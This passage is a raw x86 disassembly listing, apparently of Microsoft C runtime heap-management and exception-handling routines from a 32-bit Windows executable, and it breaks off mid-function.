  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
